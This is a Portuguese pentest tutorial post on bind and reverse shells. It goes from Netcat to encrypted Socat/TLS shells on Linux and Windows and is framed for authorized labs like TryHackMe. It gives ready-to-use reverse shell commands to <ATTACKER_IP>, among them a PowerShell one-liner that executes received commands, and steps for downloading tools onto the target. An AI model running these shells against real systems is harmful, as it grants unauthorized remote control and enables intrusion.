---
layout: post
title: "Bind Shell e Reverse Shell - do Netcat ao Socat/TLS"
description: "Guia prático sobre bind e reverse shell com Netcat e Socat, incluindo Windows, Linux, transferência de ferramentas, upgrade de TTY, TLS e troubleshooting."
date: 2026-10-07
categories: [tutorial, pentest, linux, windows]
tags: [reverse-shell, bind-shell, netcat, socat, powershell, tty, pty, tls, openssl, windows, linux, tryhackme]
---

# Bind Shell e Reverse Shell - do Netcat ao Socat/TLS

## 1. Introdução

Uma **shell** é um programa usado para interagir com o sistema operacional por meio de comandos.

Exemplos:

~~~text
Linux
├── /bin/bash
├── /bin/sh
└── zsh

Windows
├── cmd.exe
└── powershell.exe
~~~

Quando falamos em **bind shell** e **reverse shell**, estamos adicionando uma conexão de rede entre nosso terminal e essa shell.

De forma resumida:

~~~text
Bind Shell
Você se conecta ao alvo.

Reverse Shell
O alvo se conecta a você.
~~~

> Este material foi produzido para estudo em laboratórios autorizados, como TryHackMe. Utilize essas técnicas apenas em sistemas próprios ou ambientes para os quais exista autorização explícita.

Nos exemplos:

~~~text
<ATTACKER_IP> = máquina atacante
<TARGET_IP>   = máquina alvo
~~~

---

# 2. O que acontece em uma shell remota?

A shell não é a conexão de rede. Programas como **Netcat** e **Socat** transportam a entrada e a saída da shell pela rede.

~~~text
Seu terminal
     │
     │ rede
     ▼
Netcat / Socat
     │
     ▼
bash / cmd.exe / powershell.exe
~~~

Para uma conexão TCP precisamos, no mínimo, de endereço IP, porta, um lado ouvindo e outro lado iniciando a conexão.

É a posição do **listener** que diferencia bind de reverse shell.

---

# 3. Bind Shell x Reverse Shell

| Tipo | Listener | Quem inicia a conexão? | Fluxo |
|---|---|---|---|
| **Bind Shell** | Alvo | Atacante | Attacker → Target |
| **Reverse Shell** | Atacante | Alvo | Target → Attacker |

## Reverse Shell

~~~text
TARGET                           ATTACKER

bash / PowerShell
       │
       └──────── TCP ───────────► listener
~~~

O atacante abre uma porta e espera. O alvo inicia a conexão e associa uma shell a ela.

## Bind Shell

~~~text
ATTACKER                         TARGET

cliente
   │
   └────────── TCP ─────────────► listener
                                      │
                                      ▼
                                    shell
~~~

Agora quem abre a porta e espera é o alvo.

---

# 4. Reverse Shell com Netcat

No atacante:

~~~bash
nc -lvnp 4444
~~~

Saída típica:

~~~text
listening on 0.0.0.0 4444
~~~

Isso não significa que o Netcat travou. Ele está aguardando uma conexão.

### Opções

| Opção | Função |
|---|---|
| <code>-l</code> | Listen: aguarda conexão |
| <code>-v</code> | Verbose: mostra mais informações |
| <code>-n</code> | Não resolve DNS |
| <code>-p</code> | Define a porta |

Em um alvo Linux com uma versão do Netcat que suporta a opção <code>-e</code>:

~~~bash
nc <ATTACKER_IP> 4444 -e /bin/bash
~~~

Fluxo:

~~~text
/bin/bash
    │
    ▼
Netcat no alvo
    │
    │ TCP
    ▼
<ATTACKER_IP>:4444
    │
    ▼
Netcat listener
~~~

A opção <code>-e /bin/bash</code> liga o programa <code>/bin/bash</code> à conexão.

> Nem todas as implementações modernas do Netcat possuem a opção <code>-e</code>.

---

# 5. Reverse Shell no Windows sem Netcat

Uma instalação padrão do Windows não deve ser tratada como se já tivesse <code>nc.exe</code> ou <code>socat.exe</code>.

Em um laboratório, uma situação mais realista é conseguir uma primeira shell com ferramentas nativas e só depois transferir ferramentas adicionais.

No atacante:

~~~bash
nc -lvnp 4444
~~~

No PowerShell do alvo:

~~~powershell
$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
~~~

No atacante:

~~~powershell
whoami
hostname
~~~

Agora já controlamos o PowerShell através da conexão TCP.

---

# 6. Bind Shell com Netcat

No bind shell o listener muda de lado.

No alvo Linux:

~~~bash
nc -lvnp 8080 -e /bin/bash
~~~

No atacante:

~~~bash
nc <TARGET_IP> 8080
~~~

Fluxo:

~~~text
Attacker                      Target

nc --------------------------> nc :8080
                                  │
                                  ▼
                               /bin/bash
~~~

---

# 7. Quando usar Bind ou Reverse?

A escolha depende principalmente das regras de rede.

Em muitas redes:

~~~text
Conexões de entrada  → mais restritas
Conexões de saída    → mais permitidas
~~~

Uma bind shell depende de uma conexão iniciada em direção ao alvo:

~~~text
Attacker → Target
~~~

Isso pode ser bloqueado por firewall local, firewall de rede, ACL, NAT ou ausência de rota.

Uma reverse shell usa o caminho contrário:

~~~text
Target → Attacker
~~~

Por isso costuma funcionar melhor em muitos cenários. Isso não significa que reverse shell sempre funciona: a rede também pode possuir filtragem de saída.

---

# 8. Testando conectividade

Antes de culpar a shell, verifique a rede.

## Linux

~~~bash
nc -vz <TARGET_IP> 4444
ss -ltnp
ss -ltnp | grep 4443
ss -tnp
~~~

## Windows

~~~powershell
Test-NetConnection <ATTACKER_IP> -Port 4443
~~~

O campo importante é:

~~~text
TcpTestSucceeded : True
~~~

---

# 9. Socat

O **Socat** trabalha conectando dois fluxos de dados.

~~~text
ORIGEM <──────── socat ────────> DESTINO
~~~

Exemplo de listener TCP:

~~~bash
socat TCP-LISTEN:4444,reuseaddr STDIO
~~~

Isso significa:

~~~text
TCP :4444 ←→ terminal
~~~

Também podemos encontrar a forma abreviada:

~~~bash
socat TCP-L:4444 -
~~~

Nesse contexto:

~~~text
TCP-L = TCP Listen
-     = STDIN/STDOUT
~~~

---

# 10. Reverse Shell com Socat

No atacante:

~~~bash
socat TCP-LISTEN:4444,reuseaddr STDIO
~~~

No alvo Linux:

~~~bash
socat TCP:<ATTACKER_IP>:4444 EXEC:"bash -li"
~~~

No Windows:

~~~powershell
socat.exe TCP:<ATTACKER_IP>:4444 EXEC:powershell.exe,pipes
~~~

A opção <code>pipes</code> conecta a entrada e a saída do processo através de pipes, o que é útil para <code>cmd.exe</code> e <code>powershell.exe</code>.

---

# 11. Bind Shell com Socat

No Windows alvo:

~~~powershell
socat.exe TCP-LISTEN:8088,reuseaddr EXEC:cmd.exe,pipes
~~~

No atacante:

~~~bash
socat TCP:<TARGET_IP>:8088 STDIO
~~~

Fluxo:

~~~text
Attacker                         Windows

STDIO
  │
socat ───────── TCP ──────────► socat.exe
                                   │
                                   ▼
                                cmd.exe
~~~

---

# 12. Cenário realista: o Windows não tem Socat

Não faz muito sentido simplesmente assumir que <code>socat.exe</code> já existe no Windows.

Um fluxo mais realista é:

~~~text
1. conseguir uma shell inicial
2. servir o Socat pelo atacante
3. baixar o Socat através da shell já obtida
4. testar o executável
5. abrir uma nova conexão com Socat
6. abandonar a shell inicial
~~~

---

# 13. Servindo arquivos pelo Linux com Python

No atacante:

~~~bash
cd /root/share
python3 -m http.server 8000
~~~

Agora qualquer arquivo da pasta pode ser acessado por HTTP:

~~~text
http://<ATTACKER_IP>:8000/
~~~

Exemplo:

~~~text
/root/share/socat.exe
        ↓
http://<ATTACKER_IP>:8000/socat.exe
~~~

---

# 14. Baixando o Socat pela shell do Windows

Com PowerShell:

~~~powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/socat.exe -OutFile C:WindowsTempsocat.exe
~~~

Ou:

~~~powershell
curl.exe http://<ATTACKER_IP>:8000/socat.exe -o C:WindowsTempsocat.exe
~~~

Confirme:

~~~powershell
Get-Item C:WindowsTempsocat.exe
~~~

Teste:

~~~powershell
C:WindowsTempsocat.exe -V
~~~

Esse último passo é importante.

---

# 15. Erro: cygwin1.dll not found

Durante o laboratório, o primeiro <code>socat.exe</code> transferido não funcionou.

Ao executar:

~~~powershell
C:WindowsTempsocat.exe -V
~~~

o Windows retornou:

~~~text
cygwin1.dll not found
~~~

Alguns builds de Socat para Windows são compilados através do **Cygwin**.

Nesse caso:

~~~text
socat.exe
   │
   ├── cygwin1.dll
   ├── DLLs OpenSSL
   └── outras dependências
~~~

Copiar somente o executável não é suficiente.

### Correção

Transfira o pacote completo contendo o executável e as DLLs exigidas pelo build, mantendo as bibliotecas junto ao <code>socat.exe</code>.

Depois:

~~~powershell
.socat.exe -V
~~~

deve executar normalmente.

Se a intenção for usar TLS, verifique também se o build possui suporte a OpenSSL.

---

# 16. Transferindo um ZIP completo

No atacante podemos servir:

~~~text
socat.zip
~~~

No Windows:

~~~powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/socat.zip -OutFile C:WindowsTempsocat.zip
~~~

Extraia:

~~~powershell
Expand-Archive C:WindowsTempsocat.zip -DestinationPath C:WindowsTempsocat -Force
~~~

Confira:

~~~powershell
Get-ChildItem C:WindowsTempsocat
~~~

E teste:

~~~powershell
C:WindowsTempsocatsocat.exe -V
~~~

---

# 17. Upgrade de uma shell Linux com Python PTY

Uma shell obtida com Netcat normalmente possui várias limitações:

- histórico ruim;
- setas podem não funcionar;
- Ctrl+C pode encerrar a conexão;
- programas interativos podem se comportar mal;
- job control limitado.

Primeiro descubra o tamanho do terminal local:

~~~bash
stty size
~~~

Exemplo:

~~~text
50 220
~~~

Na shell remota:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
~~~

Suspenda a sessão:

~~~text
Ctrl+Z
~~~

No terminal local:

~~~bash
stty raw -echo
fg
~~~

Pressione Enter e, no remoto:

~~~bash
stty rows 50 cols 220
~~~

Ao terminar:

~~~bash
stty sane
~~~

Se o terminal local ficar quebrado:

~~~bash
reset
~~~

---

# 18. rlwrap

Outra melhoria simples:

~~~bash
rlwrap nc -lvnp 4444
~~~

O <code>rlwrap</code> adiciona recursos de edição da linha e histórico ao programa que ele envolve.

Ele não transforma Netcat em um TTY completo, mas melhora bastante a utilização.

---

# 19. Shell Linux mais completa com Socat

No atacante:

~~~bash
socat TCP-LISTEN:5555 FILE:$(tty),raw,echo=0
~~~

No alvo:

~~~bash
socat TCP:<ATTACKER_IP>:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
~~~

| Opção | Função |
|---|---|
| <code>pty</code> | Cria um pseudo-terminal |
| <code>stderr</code> | Encaminha a saída de erro |
| <code>sigint</code> | Permite tratamento de Ctrl+C |
| <code>setsid</code> | Cria uma nova sessão |
| <code>sane</code> | Aplica configurações normais de terminal |

---

# 20. Criptografando o tráfego com TLS

Netcat normalmente transporta os dados em texto simples.

Socat pode utilizar TLS:

~~~text
Shell
  │
Socat
  │
  │ TLS
  ▼
Socat
  │
Terminal
~~~

Isso protege o conteúdo da sessão durante o transporte.

> TLS não transforma automaticamente a conexão em HTTPS. O tráfego está criptografado com TLS, mas não passa a ser uma sessão HTTP apenas por utilizar uma porta como 443.

---

# 21. Criando um certificado

No atacante:

~~~bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
~~~

Depois:

~~~bash
cat shell.key shell.crt > shell.pem
~~~

Verifique:

~~~bash
grep BEGIN shell.pem
~~~

O PEM utilizado dessa forma deve conter a chave privada e o certificado.

---

# 22. Reverse Shell criptografada com Socat

No reverse shell TLS, o atacante fica ouvindo.

No atacante:

~~~bash
socat OPENSSL-LISTEN:4443,cert=/root/share/shell.pem,verify=0,reuseaddr STDIO
~~~

O terminal pode parecer parado. Isso é normal: o Socat está aguardando uma conexão.

Para visualizar:

~~~bash
socat -d -d OPENSSL-LISTEN:4443,cert=/root/share/shell.pem,verify=0,reuseaddr STDIO
~~~

No Windows:

~~~powershell
C:WindowsTempsocatsocat.exe OPENSSL:<ATTACKER_IP>:4443,verify=0 EXEC:powershell.exe,pipes
~~~

Fluxo:

~~~text
WINDOWS                         LINUX

powershell.exe
      ▲
      │
  socat.exe
      │
      │ TLS
      ▼
<ATTACKER_IP>:4443
      │
    socat
      │
    STDIO
~~~

---

# 23. Quem precisa do certificado?

Regra simples:

> Quem executa <code>OPENSSL-LISTEN</code> precisa ter o certificado e a chave.

### Reverse TLS

~~~text
ATTACKER
OPENSSL-LISTEN
      ↓
precisa de shell.pem
~~~

### Bind TLS

~~~text
TARGET
OPENSSL-LISTEN
      ↓
precisa de shell.pem
~~~

---

# 24. Bind Shell criptografada

Primeiro transfira o certificado para o alvo.

No Windows:

~~~powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/shell.pem -OutFile C:WindowsTempshell.pem
~~~

Abra o listener TLS no Windows:

~~~powershell
C:WindowsTempsocatsocat.exe OPENSSL-LISTEN:8443,cert=C:WindowsTempshell.pem,verify=0,reuseaddr EXEC:cmd.exe,pipes
~~~

No atacante:

~~~bash
socat OPENSSL:<TARGET_IP>:8443,verify=0 STDIO
~~~

Fluxo:

~~~text
Attacker ───── TLS ─────► Target
                          OPENSSL-LISTEN
                                │
                                ▼
                              cmd.exe
~~~

---

# 25. Migrando de Netcat para Socat

Fluxo inicial:

~~~text
Windows
   │
PowerShell
   │
   └──────── TCP :4444 ───────► nc
                                 Linux
~~~

Pela shell inicial:

~~~powershell
Invoke-WebRequest http://<ATTACKER_IP>:8000/socat.zip -OutFile C:WindowsTempsocat.zip
Expand-Archive C:WindowsTempsocat.zip -DestinationPath C:WindowsTempsocat -Force
C:WindowsTempsocatsocat.exe -V
~~~

No atacante:

~~~bash
socat OPENSSL-LISTEN:4443,cert=/root/share/shell.pem,verify=0,reuseaddr STDIO
~~~

Pela shell antiga:

~~~powershell
C:WindowsTempsocatsocat.exe OPENSSL:<ATTACKER_IP>:4443,verify=0 EXEC:powershell.exe,pipes
~~~

Agora:

~~~text
Windows
PowerShell
   ↑
   │
socat.exe
   │
   │ TLS
   ▼
socat :4443
Linux
~~~

Depois de confirmar que a nova shell funciona, a conexão antiga pode ser encerrada.

---

# 26. Troubleshooting

## Listener parece travado

~~~bash
socat OPENSSL-LISTEN:4443,...
~~~

Nenhuma saída aparece.

Normalmente significa apenas:

~~~text
LISTEN
↓
aguardando conexão
~~~

Confirme:

~~~bash
ss -ltnp | grep 4443
~~~

Ou use:

~~~bash
socat -d -d OPENSSL-LISTEN:4443,...
~~~

## Connection refused

Normalmente significa que o IP respondeu, mas não há serviço ouvindo naquela porta.

~~~bash
ss -ltnp
~~~

## Timeout

Pode indicar IP incorreto, máquina desligada, rota inexistente, firewall ou porta filtrada.

Windows:

~~~powershell
Test-NetConnection <ATTACKER_IP> -Port 4443
~~~

Linux:

~~~bash
nc -vz <TARGET_IP> 4443
~~~

## Address already in use

Algum processo já está utilizando a porta.

~~~bash
ss -ltnp | grep 4443
~~~

Encerre o processo correto ou escolha outra porta.

## Socat fecha imediatamente no Windows

Use debug:

~~~powershell
socat.exe -d -d -d ...
socat.exe -V
~~~

Se ele nem iniciar, verifique dependências.

## cygwin1.dll not found

O build utilizado depende do Cygwin. Não basta copiar apenas o executável; também são necessárias as DLLs exigidas pelo build.

## TCP funciona, TLS não funciona

Isole o problema usando TCP simples.

Atacante:

~~~bash
socat TCP-LISTEN:4444,reuseaddr STDIO
~~~

Windows:

~~~powershell
socat.exe TCP:<ATTACKER_IP>:4444 EXEC:powershell.exe,pipes
~~~

Se TCP funcionar e TLS não, investigue suporte OpenSSL, certificado, caminho do PEM, DLLs e parâmetros TLS.

## Certificate verify failed

Em um laboratório com certificado autoassinado e sem validação de CA, a opção:

~~~text
verify=0
~~~

precisa estar configurada conforme o cenário.

---

# 27. Fluxo completo

~~~text
                ATTACKER

                   │
           nc -lvnp 4444
                   ▲
                   │ TCP
                   │
                Windows
              PowerShell
                   │
              shell inicial

──────────────────────────────────

Attacker:

python3 -m http.server 8000
        │
        │ HTTP
        ▼

Windows:

Invoke-WebRequest
        │
        ▼
socat.exe + DLLs

──────────────────────────────────

Attacker:

socat OPENSSL-LISTEN:4443
        ▲
        │ TLS
        │

Windows:

socat.exe
        ▲
        │
powershell.exe

──────────────────────────────────

Resultado:

Windows
   ⇅
Socat
   ⇅
TLS
   ⇅
Socat
   ⇅
Attacker
~~~

---

# 28. Bind x Reverse - resumo

| Característica | Bind | Reverse |
|---|---|---|
| Listener | Target | Attacker |
| Cliente | Attacker | Target |
| Direção inicial | Attacker → Target | Target → Attacker |
| Depende de inbound no alvo | Sim | Normalmente não |
| Pode sofrer com firewall inbound | Muito | Menos |
| Pode sofrer com firewall outbound | Menos | Sim |
| Uso comum | Situações específicas | Muito comum |

---

# 29. Siglas

| Sigla | Significado | Explicação |
|---|---|---|
| **IP** | Internet Protocol | Endereço da máquina |
| **TCP** | Transmission Control Protocol | Protocolo orientado a conexão |
| **UDP** | User Datagram Protocol | Protocolo sem conexão |
| **DNS** | Domain Name System | Resolve nomes para IP |
| **SSL** | Secure Sockets Layer | Tecnologia criptográfica antiga |
| **TLS** | Transport Layer Security | Sucessor moderno do SSL |
| **PTY** | Pseudo Terminal | Terminal virtual |
| **TTY** | Teletype/Terminal | Interface de terminal Unix |
| **STDIN** | Standard Input | Entrada padrão |
| **STDOUT** | Standard Output | Saída padrão |
| **STDERR** | Standard Error | Saída de erros |
| **RDP** | Remote Desktop Protocol | Desktop remoto Windows |
| **DLL** | Dynamic-Link Library | Biblioteca dinâmica do Windows |
| **PE** | Portable Executable | Formato de executável Windows |
| **RSA** | Rivest-Shamir-Adleman | Algoritmo criptográfico |
| **CSR** | Certificate Signing Request | Solicitação de certificado |
| **CA** | Certificate Authority | Autoridade certificadora |
| **NAT** | Network Address Translation | Tradução de endereços |
| **ACL** | Access Control List | Lista de regras de acesso |
| **I/O** | Input/Output | Entrada e saída |

---

# 30. Tabela de comandos

| Comando | Função |
|---|---|
| <code>nc -lvnp 4444</code> | Listener Netcat |
| <code>nc IP PORTA</code> | Conecta via Netcat |
| <code>nc -vz IP PORTA</code> | Testa uma porta TCP |
| <code>socat TCP-LISTEN:4444 STDIO</code> | Listener TCP Socat |
| <code>socat TCP:IP:4444 STDIO</code> | Cliente TCP Socat |
| <code>EXEC:/bin/bash</code> | Executa Bash |
| <code>EXEC:cmd.exe,pipes</code> | Executa CMD através de pipes |
| <code>EXEC:powershell.exe,pipes</code> | Executa PowerShell |
| <code>socat -V</code> | Mostra versão e recursos compilados |
| <code>socat -d -d</code> | Ativa diagnóstico |
| <code>ss -ltnp</code> | Mostra listeners TCP |
| <code>ss -tnp</code> | Mostra conexões TCP |
| <code>Test-NetConnection IP -Port N</code> | Testa TCP no Windows |
| <code>python3 -m http.server 8000</code> | Servidor HTTP simples |
| <code>Invoke-WebRequest URL -OutFile FILE</code> | Baixa arquivo no PowerShell |
| <code>curl.exe URL -o FILE</code> | Baixa arquivo no Windows |
| <code>wget URL -O FILE</code> | Baixa arquivo no Linux |
| <code>chmod +x FILE</code> | Torna arquivo executável |
| <code>stty size</code> | Mostra linhas e colunas do terminal |
| <code>stty raw -echo</code> | Coloca terminal em modo raw |
| <code>stty sane</code> | Restaura terminal |
| <code>reset</code> | Reinicializa o terminal |
| <code>rlwrap nc ...</code> | Adiciona edição/histórico ao Netcat |
| <code>openssl req ...</code> | Gera chave/certificado |
| <code>cat key crt > shell.pem</code> | Junta chave e certificado |
| <code>OPENSSL-LISTEN</code> | Socat como servidor TLS |
| <code>OPENSSL:IP:PORTA</code> | Socat como cliente TLS |
| <code>verify=0</code> | Desabilita validação de certificado no laboratório |
| <code>reuseaddr</code> | Permite reutilização do endereço |
| <code>pty</code> | Aloca pseudo-terminal |
| <code>stderr</code> | Encaminha erros |
| <code>sigint</code> | Permite sinais como Ctrl+C |
| <code>setsid</code> | Cria nova sessão |
| <code>sane</code> | Configura terminal em modo normal |

---

# 31. Regra para memorizar

~~~text
BIND
Listener = TARGET

Attacker ─────────────► Target
                       listener
                          │
                        shell


REVERSE
Listener = ATTACKER

Attacker ◄───────────── Target
listener                  │
                        shell


REVERSE TLS
Attacker ◄══════ TLS ═══ Target
  socat                 socat.exe
    │                       │
 terminal              PowerShell
~~~

Para Socat com TLS:

~~~text
OPENSSL-LISTEN
      =
lado que ESCUTA
      =
lado que precisa do shell.pem
~~~

Se essa lógica estiver clara, fica muito mais fácil entender bind, reverse, listener, cliente, porta, certificado e direção da conexão.
